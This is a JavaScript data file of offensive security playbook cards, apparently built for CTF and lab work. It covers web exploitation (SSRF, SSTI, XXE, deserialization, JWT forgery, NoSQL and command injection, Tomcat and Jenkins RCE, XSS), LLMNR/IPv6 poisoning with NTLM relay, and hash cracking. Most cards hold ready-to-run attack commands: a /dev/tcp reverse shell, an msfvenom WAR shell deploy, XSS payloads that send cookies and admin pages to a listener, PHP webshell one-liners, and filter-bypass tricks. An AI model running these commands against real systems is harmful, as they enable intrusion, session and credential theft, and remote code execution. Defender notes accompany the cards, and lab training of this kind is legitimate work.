{id:'ssrf',lane:'web',title:'Server-Side Request Forgery (SSRF)',hypothesis:'Any feature that fetches a URL (preview, import, webhook, image-from-URL, XML parser) is a request proxy into the network behind the server. In labs the payoff is usually: read cloud metadata (169.254.169.254), hit internal-only admin panels, or port-scan the internal network through the app.',prereq:{any:['web.reachable']},produces:['web.ssrf_confirmed','loot.files','cloud.aws_access'],commands:[{tool:'curl',run:"curl -s 'http://{{target}}/fetch?url=http://127.0.0.1/'",note:'Baseline: can it fetch localhost? Try your listener IP too — an incoming connection proves the primitive.'},{tool:'curl',run:"curl -s 'http://{{target}}/fetch?url=http://169.254.169.254/latest/meta-data/'",note:'Cloud metadata. iam/security-credentials/ returns AWS keys on EC2 (IMDSv1). Azure: 169.254.169.254/metadata/instance?api-version=2021-02-01 with Metadata:true header.'},{tool:'curl',run:"curl -s 'http://{{target}}/fetch?url=http://127.0.0.1:8080/'",note:'Internal port sweep: loop ports, watch response length changes. Internal-only services are the real prize.'}],expected:['ami-id','instance-id','html'],onFailure:{'blocked':{note:'Filter bypass toolkit: decimal/hex IP (2130706433), 0.0.0.0, [::1], DNS rebinding, redirects from a host you control, url with @ (http://allowed.com@127.0.0.1).'}},defender:'Egress connections to metadata IPs and RFC1918 from web servers are high-signal alerts.',report:{finding:'Server-Side Request Forgery',severity:'high'},tools:['curl'],refs:['https://portswigger.net/web-security/ssrf']},

{id:'ssti',lane:'web',title:'Server-Side Template Injection (SSTI)',hypothesis:'If user input is reflected through a template engine, {{7*7}} evaluating to 49 means the server executes template code — and template code means RCE. The 0xdf corpus hits Jinja2/Twig/ASP repeatedly. Detection is engine-agnostic; exploitation is engine-specific, so identify the engine first (the template-error message usually names it).',prereq:{any:['web.reachable']},produces:['foothold.webshell'],commands:[{tool:'curl',run:"curl -s 'http://{{target}}/hello?user={{7*7}}'",note:'Detection: 49 = SSTI. Also try ${7*7}, <%= 7*7 %>, #{7*7} for other engines.'},{tool:'curl',run:"curl -s --data-urlencode 'name={{config}}' http://{{target}}/",note:'Jinja2: dump config (often leaks SECRET_KEY — see jwt-attacks).'},{tool:'curl',run:"curl -s --data-urlencode \"name={{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}\" http://{{target}}/",note:'Jinja2 RCE chain via context object. PayloadsAllTheThings has per-engine chains (Twig, Freemarker, ASP <% %>).'}],expected:['49'],onFailure:{'7*7 rendered literally':{note:'Not vulnerable in this field — try every reflected parameter, error pages, and email/rename templates; SSTI hides in weird sinks.'}},defender:'Template evaluation errors and os.popen references in request logs.',report:{finding:'Server-Side Template Injection (RCE)',severity:'critical'},tools:['curl'],refs:['https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html']},

{id:'xxe',lane:'web',title:'XML External Entity (XXE) Injection',hypothesis:'Any endpoint that parses XML (file upload, API, SAML, docx/xlsx parsers) may resolve external entities — file read, SSRF, and occasionally RCE. Identify XML parsers by uploading content or changing Content-Type to application/xml and watching for parse errors.',prereq:{any:['web.reachable']},produces:['loot.files','web.ssrf_confirmed'],commands:[{tool:'curl',run:"curl -s -X POST http://{{target}}/api -H 'Content-Type: application/xml' -d '<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"file:///etc/passwd\">]><r>&x;</r>'",note:'Classic file read. If entities are parsed, /etc/passwd comes back in the response.'},{tool:'curl',run:"curl -s -X POST http://{{target}}/api -H 'Content-Type: application/xml' -d '<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"php://filter/convert.base64-encode/resource=index.php\">]><r>&x;</r>'",note:'PHP targets: base64-wrap the read so the source survives XML parsing.'},{tool:'curl',run:"curl -s -X POST http://{{target}}/api -H 'Content-Type: application/xml' -d '<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"http://{{lhost}}:{{lport}}/xxe\">]><r>&x;</r>'",note:'Blind XXE: no output? Check your listener for the outbound hit, then escalate to out-of-band exfil via external DTD.'}],expected:['root:x:0:0','<!DOCTYPE'],onFailure:{'DOCTYPE is disallowed':{note:'Parser hardened against DTDs — try XInclude, SVG/docx upload parsers, or parameter entities.'}},defender:'DOCTYPE declarations and file:///http: entity references in request bodies are trivially signatured.',report:{finding:'XML External Entity Injection',severity:'high'},tools:['curl'],refs:['https://portswigger.net/web-security/xxe']},

{id:'deserialization',lane:'web',title:'Insecure Deserialization',hypothesis:'Serialized objects in cookies, ViewStates, or API bodies are execution primitives when the server trusts them. Signatures: Java (rO0AB base64 / \\xac\\xed), .NET (__VIEWSTATE, /wEP), PHP (O:4:). Exploitation needs the right gadget chain for the libraries in play — ysoserial (Java), ysoserial.net (.NET), phpggc (PHP) generate them.',prereq:{any:['web.reachable']},produces:['foothold.webshell'],commands:[{tool:'ysoserial',run:"ysoserial CommonsCollections5 'ping -c 3 {{lhost}}' | base64 -w0",note:'Java: generate a gadget chain payload. Use a pingback to your listener to confirm execution before staging anything bigger — 0xdf does this every time.'},{tool:'curl',run:"curl -s -X POST http://{{target}}/api --data-binary 'payload=<base64-blob>'",note:'Deliver the payload in the parameter/cookie/ViewState you identified.'},{tool:'sh',run:"java -jar ysoserial.jar | grep -i 'gadget\\|chain' | head -30",note:'List available chains. Match the chain to libraries visible in error messages, /WEB-INF dumps, or the app stack.'}],expected:['ping from target','icmp'],onFailure:{'no callback':{note:'Wrong gadget chain for their libraries, or egress filtered. Try DNS-only payloads, another chain, or confirm the input is actually deserialized (corrupt it and watch for a stack trace).'}},defender:'Deserialization filters and JVM/.NET instrumentation catch gadget class names; base64 rO0AB in requests is a signature.',report:{finding:'Insecure Deserialization (RCE)',severity:'critical'},tools:['ysoserial','curl','java'],refs:['https://github.com/frohoff/ysoserial']},

{id:'jwt-attacks',lane:'web',title:'JWT Attacks',hypothesis:'JSON Web Tokens are only as strong as their signing secret and verification logic. Attack ladder: (1) decode and read claims, (2) try alg:none, (3) brute weak HMAC secrets offline, (4) if you found the app source (git-exposed, LFI), steal the hardcoded secret and forge admin tokens — the most common 0xdf outcome.',prereq:{any:['web.reachable']},produces:['access.admin','credential.plaintext'],commands:[{tool:'sh',run:"echo '{{token}}' | cut -d. -f2 | base64 -d 2>/dev/null",note:'Decode the payload — see what claims exist (user, role, admin flags). jwt.io does the same in a browser.'},{tool:'hashcat',run:'hashcat -m 16500 {{hashfile}} {{wordlist}}',note:'Mode 16500 cracks HMAC secrets offline. Weak secrets (secret, key, app names) fall constantly.'},{tool:'sh',run:"python3 -c \"import jwt; print(jwt.encode({'user':'admin','role':'admin'}, '{{password}}', algorithm='HS256'))\"",note:'Forge a token with the cracked/leaked secret. PyJWT: pip install pyjwt.'},{tool:'sh',run:"python3 -c \"import jwt; print(jwt.encode({'user':'admin'}, '', algorithm='none'))\"",note:'alg:none variant — worth 10 seconds on every JWT you meet.'}],expected:['eyJ','signature verified'],onFailure:{'invalid signature':{note:'Secret not weak and not leaked — look for the source (git, LFI, JS bundles) or an algorithm confusion (RS256 public key used as HS256 secret).'}},defender:'Token verification failures and sudden claim changes (user: admin) are detectable at the app layer.',report:{finding:'JWT Forgery via Weak/Leaked Secret',severity:'high'},tools:['hashcat','python3'],refs:['https://portswigger.net/web-security/jwt']},

{id:'nosql-injection',lane:'web',title:'NoSQL Injection',hypothesis:'MongoDB-backed logins often accept operator objects where strings are expected: user[$ne]=x&pass[$ne]=x logs you in as the first user (usually admin). And when equality works but you need the password, regex extraction ($regex) leaks it character by character — the Mango technique.',prereq:{any:['web.reachable']},produces:['access.admin','credential.plaintext'],commands:[{tool:'curl',run:"curl -s -X POST http://{{target}}/login -d 'user[$ne]=x&pass[$ne]=x'",note:'Login bypass: match any user where user!=x and pass!=x. JSON variant: {\"user\":{\"$ne\":null},\"pass\":{\"$ne\":null}} with Content-Type: application/json.'},{tool:'sh',run:"for c in a b c d; do curl -s -X POST http://{{target}}/login -d \"user=admin&pass[\$regex]=^$c\" | grep -q success && echo $c; done",note:'Boolean oracle via $regex: a hit means the password starts with that char. Script the full charset and iterate position by position.'}],expected:['success','redirect','dashboard'],onFailure:{'login failed':{note:'App may sanitize arrays — try Content-Type: application/json body instead, or query-string operators (?user[$gt]=). PayloadsAllTheThings NoSQL page has the full set.'}},defender:'Operator objects ($ne/$regex) in auth logs are unambiguous attack signatures.',report:{finding:'NoSQL Injection (Auth Bypass)',severity:'high'},tools:['curl'],refs:['https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection']},

{id:'tomcat-deploy',wl:['default-creds'],lane:'web',title:'Tomcat Manager WAR Deploy',hypothesis:'Tomcat manager credentials (default tomcat:s3cret, tomcat:tomcat, admin:admin, or found in tomcat-users.xml via LFI) turn into RCE by deploying a WAR webshell. Works over the HTML manager UI or the text API — the text API scripts cleanly with curl.',prereq:{any:['web.reachable']},produces:['foothold.webshell'],commands:[{tool:'msfvenom',run:'msfvenom -p java/jsp_shell_reverse_tcp LHOST={{lhost}} LPORT={{lport}} -f war -o rev.war',note:'Build the WAR with a JSP reverse shell.'},{tool:'curl',run:"curl -u '{{user}}:{{password}}' 'http://{{target}}:8080/manager/text/deploy?path=/shell' --upload-file rev.war",note:'Text-API deploy (0xdf tabby method). Path /shell then serves your JSP.'},{tool:'curl',run:"curl -s http://{{target}}:8080/shell/",note:'Trigger the shell. Check your listener.'}],expected:['OK - Deployed application'],onFailure:{'401':{note:'Bad creds or no manager-gui role. Look for tomcat-users.xml via LFI or defaults; also try /host-manager.'}},defender:'WAR deployments log in manager logs; new contexts appearing is a strong IOC.',report:{finding:'Tomcat Manager Authenticated RCE',severity:'critical'},tools:['msfvenom','curl'],os:['linux','windows']},

{id:'jenkins-access',wl:['default-creds'],lane:'web',title:'Jenkins Exploitation',hypothesis:'Jenkins (8080 by default) with any admin-ish access is code execution: the Script Console runs Groovy as the Jenkins user, and "build project with shell step" does the same. Even unauthenticated instances leak data — the CLI @file read bug and anonymous job listings both appear in the corpus.',prereq:{any:['web.reachable']},produces:['foothold.linux','foothold.windows','loot.files'],commands:[{tool:'curl',run:'curl -s http://{{target}}:8080/script',note:'Script Console presence check (needs auth on secured instances). Groovy: println "id".execute().text runs commands.'},{tool:'sh',run:"java -jar jenkins-cli.jar -s http://{{target}}:8080/ help @/etc/passwd",note:'CVE-2024-23897 style CLI file read: the @filepath expansion leaks files (first lines) unauthenticated on vulnerable versions.'},{tool:'curl',run:"curl -s http://{{target}}:8080/asynchPeople/",note:'User list. Also try /securityRealm/user/admin/api/json for anonymous user disclosure.'}],expected:['Jenkins','Groovy'],onFailure:{'403':{note:'Locked down — you need creds. Check for them in git repos, config files, or brute weak admin passwords; then come back.'}},defender:'Script console usage is logged and alerts in any mature environment; builds spawning shells are visible in job history.',report:{finding:'Jenkins Console Access (RCE)',severity:'critical'},tools:['curl','java'],os:['linux','windows'],refs:['https://www.jenkins.io/doc/book/security/']},

{id:'wordpress',lane:'web',title:'WordPress Attack Surface',hypothesis:'WordPress means wpscan: enumerate plugins/themes/users, match versions to CVEs, then either exploit a vulnerable plugin or — if you land admin creds — edit a theme file (Appearance → Editor) or upload a plugin zip for the shell. XML-RPC (xmlrpc.php) gives an amplified login-bruteforce channel.',prereq:{any:['web.reachable']},produces:['exploit.candidate','foothold.webshell','ad.user_list'],commands:[{tool:'wpscan',run:'wpscan -e ap,t,tt,u --url http://{{target}} --api-token $WPSCAN_API',note:'Enumerate all plugins, themes, timthumbs, users. Free API token from wpscan.com unlocks the vuln DB. 0xdf standard scan.'},{tool:'wpscan',run:'wpscan -e ap --plugins-detection aggressive --url http://{{target}}',note:'Aggressive plugin detection when passive finds nothing — noisier, more complete.'},{tool:'curl',run:"curl -s http://{{target}}/xmlrpc.php -d '<methodCall><methodName>system.listMethods</methodName></methodCall>'",note:'If xmlrpc responds with methods, wp.getUsersBlogs enables password testing at scale.'}],expected:['WordPress','plugin','users'],onFailure:{'not wordpress':{note:'Fingerprint mismatch — check /wp-login.php manually; custom themes still run WP under the hood.'}},defender:'wpscan is fingerprintable by user-agent and request pattern; xmlrpc abuse floods auth logs.',report:{finding:'WordPress Vulnerable Component',severity:'high'},tools:['wpscan','curl'],refs:['https://wpscan.com/','https://github.com/wpscanteam/wpscan']},

{id:'nikto-scan',lane:'web',title:'Web Server Vulnerability Scan (nikto)',hypothesis:'nikto checks for known-dangerous files, outdated server software, and classic misconfigurations — it finds the things content discovery misses (default scripts, sample apps, dangerous HTTP methods). It is SLOW and VERY loud, so run it in the background while you enumerate by hand, and treat every finding as a lead to verify, never a conclusion.',prereq:{any:['web.reachable']},produces:['exploit.candidate','web.content_map'],commands:[{tool:'nikto',run:'nikto -h http://{{target}} -o scans/nikto.txt',note:'Standard scan. Start it, background it, keep working — it takes a while.'},{tool:'nikto',run:'nikto -h https://{{target}} -ssl -o scans/nikto-ssl.txt',note:'HTTPS targets need -ssl. Add -p to limit ports on multi-port scans.'},{tool:'nikto',run:'nikto -h http://{{target}} -Tuning 123bde -o scans/nikto-interesting.txt',note:'Focused tuning: skip the pure-noise checks (x = reverse-lookup junk etc.), keep file/misconfig/software checks.'}],expected:['OSVDB','+ /'],onFailure:{'0 items reported':{note:'Normal on hardened targets. nikto excels at old/default installs; a clean result means nothing about app-level bugs.'}},defender:'One of the most-signatured tools in existence — user-agent LibWhisker, thousands of probe paths. IDS will see it instantly.',report:{finding:'Web Server Misconfiguration (nikto)',severity:'low'},tools:['nikto'],refs:['https://github.com/sullo/nikto']},

{id:'command-injection',lane:'web',title:'OS Command Injection',hypothesis:'Any parameter that feeds a system call (ping forms, IP lookups, filename converters, PDF generators) may let you append commands. Confirm with a harmless probe, then enumerate with id/hostname, and only then reach for a shell. The separator is the whole game: ; | && || newline and $() each behave differently — and output-hiding separators (|, &&) still execute even when you see nothing (that is blind injection: prove it with sleep).',prereq:{any:['web.parameterized','web.reachable']},produces:['web.cmdi_confirmed','foothold.webshell'],commands:[{tool:'curl',run:"curl -s 'http://{{target}}/ping.php?ip=127.0.0.1;id'",note:'Baseline separators to cycle: ; %0a (newline) & | && || `id` $(id). Watch the response body AND the response time.'},{tool:'curl',run:"curl -s -o /dev/null -w '%{time_total}\\n' 'http://{{target}}/ping.php?ip=127.0.0.1;sleep+5'",note:'Blind confirmation: 5-second delay = execution, even with zero output. icmp: ;ping+-c4+{{lhost}} with tcpdump running locally.'},{tool:'curl',run:"curl -s 'http://{{target}}/ping.php?ip=127.0.0.1;cat${IFS}/etc/passwd'",note:'Filter bypasses (Linux): ${IFS} or %09 for spaces, ${PATH:0:1} for slashes, {cat,/etc/passwd} brace expansion, quotes/case (c"a"t, WhOaMi on Windows), base64: bash<<<$(base64 -d<<<Y2F0...)'},{tool:'curl',run:"curl -s 'http://{{target}}/ping.php?ip=127.0.0.1;bash+-c+\"bash+-i+>%26+/dev/tcp/{{lhost}}/{{lport}}+0>%261\"'",note:'Once confirmed: reverse shell through the injection. URL-encode specials (& → %26, spaces → +). Listener first (see listener-setup).'}],expected:['uid=','root:x:0:0'],onFailure:{'no output on any separator':{note:'Likely blind — go time-based (sleep) or out-of-band (ping/curl to your listener). Also try POST body params and other fields; the injectable parameter is rarely the first you test.'},'invalid input / filtered':{note:'Blacklist in play. Cycle the bypass set: ${IFS}, %09, quotes, case tricks, rev/base64 encoding of the whole command.'}},defender:'Shell metacharacters in request parameters and web-server-spawned shells are top-tier WAF/EDR signals.',report:{finding:'OS Command Injection',severity:'critical'},tools:['curl'],refs:['https://portswigger.net/web-security/os-command-injection']},

{id:'idor',lane:'web',title:'Insecure Direct Object Reference (IDOR)',hypothesis:'Any request carrying an object reference (?uid=, ?filename=, /api/users/123, document ids in JSON) is an access-control question: does the server check WHO asks, or only WHAT is asked? Increment ids, swap uuids, decode-and-re-encode base64/hash references, and diff against a second account you control — data returned that is not yours is the finding. Mass enumeration turns one IDOR into a data breach.',prereq:{any:['web.parameterized','web.authenticated']},produces:['loot.files','credential.candidate'],commands:[{tool:'sh',run:"echo 'Create TWO accounts (or use your account + another known user). Capture a request that returns YOUR object — profile, invoice, file — then replay it with the id changed.'",note:'The method: Burp Repeater the reference parameter (uid=1 → uid=2), and compare against the second account. Also check COOKIES and JSON bodies — references hide there too.'},{tool:'curl',run:"curl -s -H 'Cookie: session=YOURS' 'http://{{target}}/download.php?filename=ZmlsZV8xMjMucGRm' | head -c 200 | xxd | head",note:'Encoded references: base64 (filename=ZmlsZ...), hashes, uuids. Decode, identify the scheme, re-encode the neighbor value. echo ZmlsZV8xMjMucGRm | base64 -d'},{tool:'ffuf',run:"ffuf -u 'http://{{target}}/api/users/FUZZ' -w <(seq 1 5000) -H 'Cookie: session=YOURS' -mc 200 -fs 0",note:'Mass IDOR enumeration: fuzz the id range with your session, filter empty/error responses. Any hit returning another user\'s data proves the class.'},{tool:'sh',run:"grep -rhoE 'url:\"[^\"]+\"|ajax\\(' app.js | sort -u",note:'Front-end AJAX calls reveal admin/hidden endpoints with object references that the UI never shows your role. Read the JS before concluding there is nothing to fuzz.'}],expected:['200 OK','uid'],onFailure:{'403 on changed ids':{note:'Access control IS enforced on that object — move to a different reference type (files, invoices, messages) or check if only SOME methods are protected (see verb-tampering).'},'uuid4 references':{note:'Random uuids are not enumerable — but they leak: check other users\' shared links, JS source, error messages, and older API versions (v1 often used ints).'}},defender:'Per-user object access is loggable; sequential-id sweeps from one session are trivially detectable.',report:{finding:'Insecure Direct Object Reference (Broken Access Control)',severity:'high'},tools:['ffuf','curl'],refs:['https://portswigger.net/web-security/access-control/idor']},

{id:'verb-tampering',lane:'web',title:'HTTP Verb Tampering',hypothesis:'Auth rules and framework configs often cover only GET and POST: <Limit GET POST> in Apache, route decorators, WAF rules. The same endpoint hit with HEAD, PUT, OPTIONS, or PATCH may sail past authentication entirely — or let you write files (PUT) and delete resources (DELETE). Cheap to test everywhere: any 401/403 endpoint deserves a verb sweep.',prereq:{any:['web.reachable']},produces:['web.content_map','foothold.webshell'],commands:[{tool:'curl',run:'curl -s -X OPTIONS -i http://{{target}}/admin/ | grep -i allow',note:'First read the Allow header — the server tells you which verbs it accepts.'},{tool:'curl',run:"for v in GET POST HEAD PUT DELETE PATCH TRACE; do echo -n \"$v: \"; curl -s -o /dev/null -w '%{http_code} %{size_download}\\n' -X $v http://{{target}}/admin/; done",note:'Sweep the verbs against the protected endpoint. A 200 where GET gave 401/403 = auth bypass by verb. HEAD returning headers on a 403 GET is already a partial leak.'},{tool:'curl',run:"curl -s -X PUT -d '<% out.print(\"pwned\"); %>' http://{{target}}/uploads/test.jsp -i",note:'If PUT is accepted on a writable path, write a webshell directly (Tomcat/IIS classic). Then GET it to confirm execution.'}],expected:['Allow:','200'],onFailure:{'405 across the board':{note:'Server restricts methods properly — dead end here; the endpoint needs a different class of bug.'},'401 on every verb':{note:'Auth enforced at a layer above method handling. Move on.'}},defender:'Unusual methods in access logs (PUT/DELETE from clients is never normal); WAF rules for method allowlisting catch this.',report:{finding:'HTTP Verb Tampering / Method-Based Auth Bypass',severity:'high'},tools:['curl'],refs:['https://owasp.org/www-community/attacks/HTTP_Verb_Tampering']},

{id:'web-shells',lane:'web',title:'Web Shells (Laudanum & Friends)',hypothesis:'Once you can write to a webroot (upload, LFI-to-log, SQL OUTFILE, redis write, verb-tampered PUT), you need a shell file that matches the server tech. Kali ships tested collections: Laudanum (asp/aspx/jsp/php/cfm) and the /usr/share/webshells directory (php-reverse-shell, simple-backdoor, qsd). Know the paths so you are not writing shell code at 3am — pick the right one, edit in your IP/port, upload, trigger.',prereq:{any:['web.upload_confirmed','foothold.webshell','web.lfi_confirmed']},produces:['shell.reverse','web.cmdi_confirmed'],commands:[{tool:'sh',run:'ls /usr/share/webshells/ /usr/share/laudanum/ 2>/dev/null',note:'Kali inventory: /usr/share/webshells (php/php-reverse-shell.php, simple-backdoor.php, aspx, jsp) and /usr/share/laudanum (per-language cmd shells). Pick by server tech: PHP → .php, IIS → .aspx, Tomcat → .jsp or WAR (see tomcat-deploy).'},{tool:'sh',run:'cp /usr/share/webshells/php/php-reverse-shell.php prs.php && nano prs.php',note:'Edit $ip and $port near the top, then upload. For a quieter cmd-shell instead: simple-backdoor.php runs ?cmd= commands.'},{tool:'sh',run:"echo '<?php system($_GET[\"c\"]); ?>' > cmd.php",note:'The one-liner when collections are unavailable. ASPX equivalent: Laudanum aspx shell. JSP: Laudanum cmd.jsp.'},{tool:'curl',run:"curl -s 'http://{{target}}/uploads/cmd.php?c=id'",note:'Trigger and verify BEFORE upgrading to a reverse shell — a webshell that does not execute is a path problem, not a payload problem (see file-upload readback).'}],expected:['uid=','www-data'],onFailure:{'upload works, shell does not execute':{note:'Wrong interpreter mapping (.php on IIS), execution disabled on that dir, or AV ate it. Try alternate extensions, a different upload dir, or the inert Laudanum cmd-shell variants.'}},defender:'New script files in webroots, and w3wp/apache spawning cmd/bash, are flagship detections; Laudanum and php-reverse-shell are signatured verbatim.',report:{finding:'Web Shell Deployed via File Write Primitive',severity:'critical'},tools:['sh','curl'],os:['linux','windows'],refs:['https://github.com/jbarcia/Web-Shells']},

{id:'xss-basics',lane:'web',title:'Cross-Site Scripting (Cookie Theft Angle)',hypothesis:'XSS on a CTF/lab box is rarely the goal — it is a credential cannon: steal the admin session cookie (or make the admin browser fetch a URL that reveals a page only they can see), then ride their session. Test every input that reflects (search, comments, usernames, error pages), then weaponize with a callback to your listener. Reflected requires delivery (a link someone clicks); stored fires on its own and is what you hope for.',prereq:{any:['web.reachable']},produces:['credential.candidate','loot.files'],commands:[{tool:'curl',run:"curl -s 'http://{{target}}/search.php?q=<b>xssprobe123</b>' | grep -o xssprobe123",note:'Confirm reflection first with a benign unique string, then escalate to <script>alert(1)</script> in a browser. Inputs, headers (User-Agent), and error pages all reflect.'},{tool:'python3',run:'python3 -m http.server 8000',note:'Your callback listener. Any request that hits it proves a browser executed your payload — and the request carries whatever you asked for (cookie, page content).'},{tool:'sh',run:"echo \"<script>new Image().src='http://{{lhost}}:8000/c?c='+document.cookie</script>\"",note:'The payload: exfiltrate the victim cookie to your listener. Deliver via stored field (comment, username, profile) or a reflected link. Then replay the cookie in your own browser/curl: -H \"Cookie: session=STOLEN\".'},{tool:'sh',run:"echo \"<script>fetch('/admin').then(r=>r.text()).then(d=>new Image().src='http://{{lhost}}:8000/p?d='+btoa(d))</script>\"",note:'Second angle: make the ADMIN browser fetch an admin-only page and exfiltrate the content base64\'d. This reads pages you have no access to (the classic HTB pattern).'}],expected:['GET /c?c=','GET /p?d='],onFailure:{'payload reflects but never fires':{note:'Stored vs reflected confusion — if it is reflected-only, someone must CLICK your link; in labs, look for an admin-bot/report-url feature. Also check CSP headers and HttpOnly cookies (HttpOnly blocks document.cookie — pivot to the fetch-and-exfil page content angle).'}},defender:'CSP and HttpOnly are the mitigations; payloads in logs (script tags in parameters) alert any WAF.',report:{finding:'Cross-Site Scripting Leading to Session Theft',severity:'medium'},tools:['curl','python3'],refs:['https://portswigger.net/web-security/cross-site-scripting']}
]},

{ lane:'poisoning', phase:'Initial Access & Web', title:'Poisoning & Relay', version:0.1, cards:[

{id:'llmnr-responder',lane:'poisoning',title:'LLMNR/NBT-NS Poisoning',hypothesis:'Windows machines broadcast name lookups (LLMNR/NBT-NS) whenever DNS fails — which happens constantly from typos and misconfigurations. Answering those broadcasts makes victims authenticate to you, handing you NetNTLMv2 hashes to crack or relay. Zero credentials required; you just have to be on the network.',prereq:{any:['host.alive']},produces:['hash.netntlm'],commands:[{tool:'responder',run:'responder -I {{interface}}',note:'Run and wait. Hashes arrive when any Windows box in the segment fat-fingers a hostname. Add -w to also poison WPAD.'}],expected:['NBT-NS','LLMNR','SMB] NTLMv2'],onFailure:{'no hashes after 30+ min':{note:'Quiet network or no Windows clients. In AD labs, trigger lookups yourself by browsing shares with deliberate typos from a foothold.'}},defender:'Responder answers are a signature; SOC detections for LLMNR responses from non-DCS exist in every mature environment.',report:{finding:'LLMNR/NBT-NS Poisoning Captured Credentials',severity:'high'},tools:['responder'],refs:['https://github.com/lgandx/Responder']},

{id:'mitm6',lane:'poisoning',title:'IPv6 DNS Takeover (mitm6)',hypothesis:'Windows prefers IPv6 and will accept rogue DHCPv6 advertisements. mitm6 answers them and becomes the DNS server, letting you intercept authentication — most devastatingly during machine account operations. Pairs with relaying to LDAP for automatic domain compromise paths.',prereq:{any:['host.alive','ad.dc_candidate']},produces:['poison.active'],commands:[{tool:'mitm6',run:'mitm6 -d {{domain}}',note:'Run alongside ntlmrelayx; mitm6 gets the victims to you, the relay does the work. Default targets WPAD.'}],expected:['IPv6 address','DHCPv6'],onFailure:{'no traffic':{note:'IPv6 may be genuinely disabled. Check with ip -6 neigh on the segment.'}},defender:'Rogue DHCPv6 detection exists in modern NDR; the tell is a non-DHCP server answering solicit messages.',report:{finding:'IPv6 DNS Poisoning Possible',severity:'high'},tools:['mitm6'],refs:['https://github.com/dirkjanm/mitm6']},

{id:'ntlm-relay',lane:'poisoning',title:'NTLM Relay',hypothesis:'Captured authentication can be relayed instead of cracked: forward the victim\'s NTLM handshake to a target where their account has rights. SMB signing disabled = relayable SMB. Relay to LDAP(LDAPS) on a DC and you can add computers, escalate users, or set up shadow credentials. Coercion (PetitPotam) forces DC authentication to you on demand.',prereq:{any:['poison.active','ad.dc_candidate']},produces:['relay.success','ad.computer_added'],commands:[{tool:'nxc',run:'nxc smb {{target}} --gen-relay-list scans/relay-targets.txt',note:'Find hosts with SMB signing disabled — those are your relay targets.'},{tool:'ntlmrelayx',run:'ntlmrelayx.py -tf scans/relay-targets.txt -smb2support -socks',note:'Classic: relay to SMB, dump SOCKS sessions for later use.'},{tool:'ntlmrelayx',run:'ntlmrelayx.py -t ldaps://{{target}} --remove-mic --add-computer OBOL$ {{password}} --delegate-access -smb2support',note:'Relay to DC LDAP: adds a machine account and sets up resource-based delegation — a near-domain-admin path.'},{tool:'petitpotam',run:'PetitPotam.py -d {{domain}} {{lhost}} {{target}}',note:'Coerce: forces the target DC to authenticate to your listener. Check patch level first; fixed since 2021 on patched DCs.'}],expected:['SMBD-Thread','Got connection','SOCKS'],onFailure:{'SMB signing required':{note:'Target requires signing — it cannot receive SMB relays. Relay to LDAP or MSSQL instead.'},'STATUS_ACCESS_DENIED on LDAP write':{note:'Machine account quota may be 0 or LDAP signing enforced. Note it and move to other lanes.'}},defender:'NTLM relay has clear signatures: authentication from unexpected sources, machine accounts created (Event 4741), and shadow credential writes.',report:{finding:'NTLM Relay Path to Domain Compromise',severity:'critical'},tools:['ntlmrelayx','nxc','petitpotam'],refs:['https://github.com/fortra/impacket','https://github.com/topotam/PetitPotam']}
]},

{ lane:'cracking', phase:'Credential Attacks', title:'Password Attacks & Cracking', version:0.1, cards:[

{id:'hash-identify',lane:'cracking',title:'Hash Identification',hypothesis:'Cracking fails when you feed hashcat the wrong mode. Identify the hash format first — length, charset, and structure usually pin it down — then look up the mode rather than guessing.',prereq:{any:['hash.unknown','hash.asrep','hash.netntlm']},produces:['hash.identified'],commands:[{tool:'hashid',run:'hashid {{hash}}',note:'Quick format guess.'},{tool:'name-that-hash',run:'nth --text {{hash}}',note:'Second opinion; names the hashcat mode directly.'}],expected:['Hashcat Mode'],onFailure:{'no match':{note:'Possibly a salted or exotic format. Check where the hash came from — the source system narrows it more than any tool.'}},defender:'',report:{finding:'Hash Format Identified',severity:'informational'},tools:['hashid','nth'],refs:['https://github.com/psypanda/hashID','https://hashcat.net/wiki/doku.php?id=example_hashes']},

{id:'hashcat-modes',wl:['hash-cracking'],lane:'cracking',title:'Hashcat Mode Reference',hypothesis:'The modes you actually use in labs: 1000 NTLM, 5600 NetNTLMv2, 18200 AS-REP, 13100 Kerberoast TGS, 3200 bcrypt, 1800 sha512crypt, 500 md5crypt, 1700 SHA-512, 22000 WPA. rockyou plus a rules file solves most lab hashes; pure brute force is a last resort.',prereq:{any:['hash.identified']},produces:['credential.plaintext'],commands:[{tool:'hashcat',run:'hashcat -m 1000 {{hashfile}} {{wordlist}}',note:'NTLM — from secretsdump, SAM, responder DB.'},{tool:'hashcat',run:'hashcat -m 5600 {{hashfile}} {{wordlist}}',note:'NetNTLMv2 — from responder/relay captures.'},{tool:'hashcat',run:'hashcat -m 18200 {{hashfile}} {{wordlist}} -r /usr/share/hashcat/rules/best64.rule',note:'AS-REP with rules. Rules matter more than wordlist size on human passwords.'}],expected:['Cracked','Status.......: Cracked'],onFailure:{'Exhausted':{note:'Wordlist done. Escalate: bigger list, OneRuleToRuleThemAll, or cewl-generated words from the target\'s own web content.'}},defender:'',report:{finding:'Credentials Recovered via Offline Cracking',severity:'high'},tools:['hashcat'],refs:['https://github.com/hashcat/hashcat','https://hashcat.net/wiki/doku.php?id=example_hashes']},

{id:'cewl-wordlist',wl:['hash-cracking'],lane:'cracking',title:'Target-Specific Wordlists',hypothesis:'Humans choose passwords from their environment: company name, project codenames, the words on their own website. A scraped wordlist from the target plus mutation rules cracks passwords that rockyou never will.',prereq:{any:['web.reachable','ad.domain_known']},produces:['wordlist.custom'],commands:[{tool:'cewl',run:'cewl http://{{target}} -d 3 -m 5 -w wordlists/cewl.txt',note:'Scrape the site, min length 5.'},{tool:'hashcat',run:'hashcat -m 1000 {{hashfile}} wordlists/cewl.txt -r /usr/share/hashcat/rules/best64.rule',note:'Custom list + rules against your hashes.'}],expected:['Cracked'],onFailure:{'Exhausted':{note:'Add mutations: append years, common separators, leetspeak. hashcat rules or a small Python mutator.'}},defender:'',report:{finding:'Weak Password Policy (Environment-Derived Passwords)',severity:'medium'},tools:['cewl','hashcat'],refs:['https://github.com/digininja/CeWL']},

